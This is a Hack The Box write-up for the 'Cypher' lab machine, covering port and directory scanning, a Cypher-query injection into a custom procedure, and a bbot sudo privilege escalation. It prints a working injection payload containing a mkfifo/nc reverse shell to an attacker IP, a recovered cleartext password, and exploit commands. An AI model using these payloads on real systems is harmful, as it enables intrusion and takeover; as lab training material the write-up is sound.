---
name: Cypher
difficulty: medium
os: linux
platform: htb
date: 2025/07/03

img: https://labs.hackthebox.com/storage/avatars/765cd4be6f3a366ca83c7ea60bbcaaa8.png
---

## Enumeration

### Port Scan

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.57 -o allPorts
```

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

We will add `cypher.htb` to our `/etc/hosts` file to access the web service:

```bash
echo "10.10.11.57 cypher.htb" | sudo tee -a /etc/hosts
```

We try to get more information about the open ports using service version detection and script scanning using `-sC` and `-sV` options

```bash
nmap -p 22,80 -sCV -vvv 10.10.11.57 -o targeted
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be68db828e6332455446b7087b3b52b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=
|   256 e55b34f5544393f87eb6694cacd63d23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: GRAPH ASM
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We use `gobuster` to enumerate directories and files in the web application:

```bash
gobuster dir -u http://cypher.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cypher.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 4986]
/api                  (Status: 307) [Size: 0] [--> /api/docs]
/demo                 (Status: 307) [Size: 0] [--> /login]
/index                (Status: 200) [Size: 4562]
/index.html           (Status: 200) [Size: 4562]
/login                (Status: 200) [Size: 3671]
/testing              (Status: 301) [Size: 178] [--> http://cypher.htb/testing/]
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished
===============================================================
```

We find a .jar file in the `/testing` directory, which is a Java application

We can use `http://www.javadecompilers.com/` to decompile the .jar file and analyze its contents.

We find a procedure called `custom.getUrlStatusCode` that takes a URL as an argument and returns the HTTP status code of that URL. This procedure is vulnerable to command injection, allowing us to execute arbitrary commands on the server.

We can exploit this vulnerability by injecting a command that will call the `custom.getUrlStatusCode` procedure with a URL that contains a command injection payload. For example, we can use the following payload:
```
{
  POST /api/auth HTTP/1.1


  "username":"a' RETURN h.value as hash UNION CALL custom.getUrlStatusCode(\"http://localhost; sleep 2; #\") YIELD statusCode as hash RETURN hash //",
  "password":"admin"
}
```

We use `nc` to listen for incoming connections on port 4444 and then send the payload to the server:

```bash
nc -lvnp 4444
```

We use `nc` to connect to the reverse shell on the server:

```
{
  "username":"a' RETURN h.value as hash UNION CALL custom.getUrlStatusCode(\"http://localhost; sleep 4; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.90 4444 >/tmp/f; #\") YIELD statusCode as hash RETURN hash //",

  "password":"admin"
}
```

## User Exploitation

Once we have a reverse shell, we can get a persistent shell by using the following commands on the reverse shell

```bash
script /dev/null -c /bin/bash
CONTROL-Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```

We can get some credentials in .bash_history:

```
cU4btyib.20xtCMCXkBmerhK
```
We try logging in via SSH with the username `graphasm` and the password `cU4btyib.20xtCMCXkBmerhK` and it works:

```bash
ssh graphasm@cypher.htb
```

We can find the user flag in the home directory:

```bash
cat /home/graphasm/user.txt
```

```
user flag value
```

## Root Exploitation

We can check if user `graphasm` has sudo privileges:

```bash
sudo -l
```

```
User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

We can see that user `graphasm` can run the command `/usr/local/bin/bbot` as root. We can check what is this utility:
```bash
cat /usr/local/bin/bbot
```

We see its calling a python library called `bbot` and we can check the version of the library:

```bash
sudo /usr/local/bin/bbot -v
```
```
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc
```

We can see that the version is `2.1.0.4939rc`, which is vulnerable to Local Privilege Escalation.

We use `https://github.com/Housma/bbot-privesc` repository to exploit the vulnerability:

```bash
git clone https://github.com/Housma/bbot-privesc.git
cd bbot-privesc
sudo /usr/local/bin/bbot -t dummy.com -p preset.yml --event-types ROOT
```

A privilege shell is spawned as root. We can read the root flag:

```bash
cat /root/root.txt
```

```
root flag value
```

## Conclusion
This writeup details the steps taken to exploit the Cypher machine on Hack The Box, from initial enumeration to privilege escalation and obtaining both user and root flags. The process involved web application exploitation, command injection, and leveraging a known vulnerability in the `bbot` utility to gain root access.
This writeup serves as a guide for those looking to understand the exploitation techniques used in this machine

